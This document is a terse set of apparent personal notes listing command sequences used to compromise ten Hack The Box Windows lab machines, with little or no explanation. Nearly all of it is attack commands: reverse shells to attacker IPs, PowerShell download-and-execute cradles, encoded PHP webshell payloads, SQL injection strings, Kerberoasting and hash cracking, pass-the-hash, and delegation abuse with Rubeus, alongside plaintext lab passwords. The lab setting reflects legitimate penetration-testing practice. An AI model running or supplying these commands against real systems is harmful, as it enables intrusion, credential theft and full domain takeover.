# Win-Active
https://0xdf.gitlab.io/2018/12/08/htb-active.html
```
enum4linux 10.10.10.100
smbclient \\\\10.10.10.100\\Replication
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
ldapsearch -x -b "dc=active,dc=htb" -H ldap://10.10.10.100 -D SVC_TGS -w GPPstillStandingStrong2k18 > ldapsearch.txt
./GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.10.10.100 –request
john hash_admin -w=/usr/share/wordlists/rockyou.txt
./wmiexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
./psexec.py Administrator:Ticketmaster1968@10.10.10.100
```


# Win-Cerberus
```
nano /etc/hosts
http://icinga.cerberus.local:8080/icingaweb2/authentication/login
https://github.com/doosec101/CVE-2022-24716
python3 exploit.py -h
python3 exploit.py http://icinga.cerberus.local:8080/icingaweb2 /etc/icingaweb2/resources.ini
http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/resources.ini
openssl genrsa -out private-key.pem 1024
Configuration – Application: Create a New Resource
../../../../../../../../../../../../dev/shm/test.txt
python3 exploit.py http://icinga.cerberus.local:8080/icingaweb2 /dev/shm/test.txt
echo "sh -i >& /dev/tcp/10.10.14.2/10001 0>&1" | base64 -w 0
../../../../../dev/shm/training/configuration.php
Module path: /dev/shm/
Triger: Click Access Control
python3 exploit.py http://icinga.cerberus.local:8080/icingaweb2 /dev/shm/training/configuration.php
python3 -c 'import pty; pty.spawn("/bin/bash")’
find / -perm -4000 2>/dev/null
firejail --version
https://www.openwall.com/lists/oss-security/2022/06/08/10/1
./firejoin.py
firejail --join=3089
su -
ifconfig
ps aux | grep root
cd /var/lib/sss/db
strings cache_cerberus.local.ldb | sort -u | head
john hash -w=/usr/share/wordlists/rockyou.txt
msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=10.10.14.2 lport=10002 -f elf -o shell
use exploit/multi/handler
run -j
use auxiliary/server/socks_proxy
run -j
nano /etc/proxychains4.conf
wget http://10.10.14.2:8000/shell
./shell &
use post/multi/manage/autoroute
proxychains evil-winrm -i 172.16.22.1 -u matthew -p 147258369
netstat -ano | select-string LIST
cat /etc/hosts
git clone https://github.com/jpillora/chisel.git
./chisel_1.9.0_linux_amd64 server --socks5 -p 6666 --reverse
iwr('http://10.10.14.2:8000/chisel_1.9.0_windows_amd64') -outfile chisel.exe
start-process -filepath .\chisel.exe -args "client 10.10.14.2:6666 R:8888:socks"
nano /etc/proxychains4.conf
New SOCKS proxy
https://dc.cerberus.local:9251
wget https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966.rb
cd "C:\program files (x86)\manageengine\ADSelfService Plus\backup“
download OfflineBackup_20230214064809.ezip
7z x OfflineBackup_20230214064809.ezip
grep -i issuer_url *
```


# Win-Conceal
https://0xdf.gitlab.io/2019/05/18/htb-conceal.html
```
nmap -sU 10.10.10.116
https://book.hacktricks.xyz/network-services-pentesting/ipsec-ike-vpn-pentesting
ike-scan -M 10.10.10.116
snmpwalk -v2c -c public 10.10.10.116
https://crackstation.net/
ipsec up conceal
nmap -sT -p- 10.10.10.116
ftp 10.10.10.116 : anonymous
put cmd.asp
http://10.10.10.116/upload/cmd.asp?cmd=whoami
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
http://10.10.10.116/upload/cmd.asp?cmd=powershell%20iex(New-Object%20Net.Webclient).downloadstring(%27http://10.10.14.7/Invoke-PowerShellTcp.ps1%27)
SeImpresonatePrivilege : JuicyPotato
https://0xdf.gitlab.io/2019/05/18/htb-conceal.html
```


# Win-Forest
https://0xdf.gitlab.io/2020/03/21/htb-forest.html
```
ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161 > ldapsearch.txt
enum4linux 10.10.10.161
./GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/’
john hashsvc -w=/usr/share/wordlists/rockyou.txt
crackmapexec winrm 10.10.10.161 -u svc-alfresco -p s3rvice
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
iex(new-object net.webclient).downloadstring("http://10.10.14.13/SharpHound.ps1")
invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
./smbserver.py share . -smb2support -username df -password df
CanPSRemote
iex(new-object net.webclient).downloadstring("http://10.10.14.13/PowerView.ps1")
./secretsdump.py svc-alfresco:s3rvice@10.10.10.161
./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161
./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
```


# Win-Jerry
```
nmap -p- -T5 10.10.10.95
http://10.10.10.95:8080/
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.95:8080/manager/FUZZ -e .aspx,.php,.txt,.html,.sh
http://10.10.10.95:8080/manager/html
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=80 -f war -o revshell.war
nc -nlvp 80
http://10.10.10.95:8080/revshell/
```


# Win-Search
https://0xdf.gitlab.io/2022/04/30/htb-search.html
```
smbclient \\\\10.10.11.129\\RedirectedFolders$ -U search.htb/hope.sharp
ldapdomaindump -u search\\hope.sharp -p IsolationIsKey? 10.10.11.129
./GetUserSPNs.py search.htb/hope.sharp -dc-ip 10.10.11.129 -request
john hash-web_svc -w=/usr/share/wordlists/rockyou.txt
grep "HelpDesk User" domain_users.grep | awk -F'\t' '{print $3}'
crackmapexec smb 10.10.11.129 -u user_opt.txt -p @3ONEmillionbaby
sheetProtection
pfx2john staff.pfx > pfx_hash
./SharpHound.exe
./smbserver.py share . -smb2support -username df -password df
./BloodHound
Read GMSA Password
./wmiexec.py 'search/tristan.davies:0xdf0xdf!!!@10.10.11.129'
```


# Win-Sniper
```
http://10.10.10.151/user/login.php
http://10.10.10.151/user/login.php
http://10.10.10.151/blog/?lang=blog-en.php
http://10.10.10.151/blog/?lang=/windows/win.ini
curl -X GET http://10.10.10.151/blog/?lang=/windows/win.ini
register: sahrul / sahrul
curl -X GET http://10.10.10.151/blog/?lang=/windows/temp/sess_5hvbj099bc64r0jnqfoatc9k4k
<?=`powershell whoami`?> / pass123
curl -X GET http://10.10.10.151/blog/?lang=/windows/temp/sess_5hvbj099bc64r0jnqfoatc9k4k
echo "wget http://10.10.14.2/nc.exe -o C:\\Windows\\TEMP\\nc.exe" | iconv -t UTF-16LE | base64
<?=`powershell /enc dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAvAG4AYwAuAGUAeABlACAALQBvACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQARQBNAFAACgBjAC4AZQB4AGUACgA=`?>
curl -X GET http://10.10.10.151/blog/?lang=/windows/temp/sess_5hvbj099bc64r0jnqfoatc9k4k
echo "C:\Windows\TEMP\nc.exe -e cmd.exe 10.10.14.2 4444" | iconv -t UTF-16LE | base64
<?=`powershell /enc QwA6AFwAVwBpAG4AZABvAHcAcwBcAFQARQBNAFAACgBjAC4AZQB4AGUAIAAtAGUAIABjAG0AZAAuAGUAeABlACAAMQAwAC4AMQAwAC4AMQA0AC4AMgAgADQANAA0ADQACgA=`?>
curl -X GET http://10.10.10.151/blog/?lang=/windows/temp/sess_5hvbj099bc64r0jnqfoatc9k4k
more C:\inetpub\wwwroot\user\db.php
$password = convertto-securestring -AsPlainText -Force -String
"36mEAhz/B8xQ~2VM";
$credential = new-object -typename System.Management.Automation.PSCredential -
argumentlist "SNIPER\chris",$password;
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { wget
http://10.10.14.23/nc.exe -o C:\Users\chris\nc.exe } -credential $credential;
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\Users\chris\nc.exe -e
cmd.exe 10.10.14.23 4444} -credential $credential;
wget http://10.10.14.23/instructions.chm -o C:\Users\chris\instructions.chm
hashcat -m 5600 --force hash.txt rockyou.txt
$password = convertto-securestring -AsPlainText -Force -String "butterfly!#1";
$credential = new-object -typename System.Management.Automation.PSCredential -
argumentlist "SNIPER\Administrator",$password;
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\Users\chris\nc.exe -e
cmd.exe 10.10.14.23 5555} -credential $credential;
```


# Win-StreamIO

```
https://watch.streamio.htb/
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u https://watch.streamio.htb/FUZZ -fc 403 -e .aspx,.php,.txt,.html
https://watch.streamio.htb/search.php
10' union select 1,2,3,4,5,6 -- -
10' union select 1,@@version,3,4,5,6 -- -
10' union select 1,(select DB_NAME()),3,4,5,6 -- -
10' union select 1,CONCAT(username, ' ', password),3,4,5,6 FROM users-- -
https://crackstation.net/
https://streamio.htb/login.php
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/FUZZ' -b PHPSESSID=uuvl3he49lki4offn75s78p6m4 -e .php
crackmapexec winrm streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
evil-winrm -i streamIO.htb -u nikk37 -p get_dem_girls2@yahoo.com
upload winPEASx64.exe
./winPEASx64.exe
git clone https://github.com/fox-it/BloodHound.py.git
cd BloodHound.py
python3 setup.py install
python3 bloodhound.py -d streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -gc dc.streamio.htb -ns 10.10.11.158 -c all --zip
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
upload PowerView.ps1
. .\PowerView.ps1
$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText –Force
$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity JDgodd -Cred $cred
Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Cred $cred -Rights All
Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Cred $cred
net group 'CORE STAFF'
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
evil-winrm -i streamIO.htb -u administrator -p e1JFg,55n-b2w5
```


# Win-Support
```
smbclient -L \\\\10.10.11.174\\
smbclient \\\\10.10.11.174\\support-tools
unzip UserInfo.exe.zip
cat UserInfo.exe.config
wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip
unzip Linux.x64.Release.zip
unzip ILSpy-linux-x64-Release.zip
cd artifacts/linux-arm64
sudo ./ILSpy
decrypt.py
wget https://dlcdn.apache.org/directory/studio/2.0.0.v20210717-M17/ApacheDirectoryStudio-2.0.0.v20210717-M17-linux.gtk.x86_64.tar.gz
tar -xf ApacheDirectoryStudio-2.0.0.v20210717-M17-linux.gtk.x86_64.tar.gz
./ApacheDirectoryStudio
evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
Get-ADDomain
echo '10.10.11.174 dc.support.htb' | sudo tee -a /etc/hosts
whoami /groups
sudo neo4j start
/opt/BloodHound/BloodHound-linux-x64 ./BloodHound --no-sandbox
upload SharpHound.exe
./SharpHound.exe
download 20240514001541_BloodHound.zip
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
upload PowerView.ps1
. ./PowerView.ps1
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
git clone https://github.com/Kevin-Robertson/Powermad.git
upload Powermad.ps1
. ./Powermad.ps1
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
Get-ADComputer -identity FAKE-COMP01
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
upload Rubeus.exe
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
.\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
https://www.browserling.com/tools/remove-all-whitespace
base64 -d ticket.kirbi.b64 > ticket.kirbi
locate ticketConverter.py
./ticketConverter.py ticket.kirbi ticket.ccache
locate psexec.py
KRB5CCNAME=ticket.ccache ./psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```


# Win-Timelapse
```
smbclient -L \\\\10.10.11.152\\
smbclient \\\\10.10.11.152\\Shares
zip2john winrm_backup.zip > hash_zip
john hash_zip -w=/usr/share/wordlists/rockyou.txt
pfx2john legacyy_dev_auth.pfx > hash_pfx
john hash_pfx -w=/usr/share/wordlists/rockyou.txt
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out prv.key
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
evil-winrm -i 10.10.11.152 -S -c cert.crt -k prv.key -p -u
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
net user svc_deploy
upload AdmPwd.PS
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
evil-winrm -i 10.10.11.152 -S -u administrator -p 'A+@PQh;Cj0+{Cb2oBJBybYry'
```
